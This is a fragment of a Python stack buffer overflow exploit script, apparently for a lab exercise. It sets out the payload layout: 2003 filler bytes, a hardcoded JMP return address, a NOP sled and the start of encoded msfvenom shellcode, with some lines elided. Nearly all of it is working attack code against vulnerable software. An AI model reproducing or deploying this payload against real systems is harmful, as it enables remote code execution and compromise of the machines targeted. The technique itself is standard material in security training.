...
10/17/2023
Buffer Overflow
This will require identifying vulnerable dll, its return address and a custom shellcode from msfvenom 
'''

import sys, socket
from time import sleep

overflow = (b"\xb8\x5c\x1e\x35\x96\xd9\xc6\xd9\x74\x24\xf4\x5b\x31\xc9\xb1" # This is the encoded shellcode from msfvenom
...
shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + overflow # Fill buffer with 2003 "A", Fill EIP with JMP code, NOP sled padding, malicious overflow payload
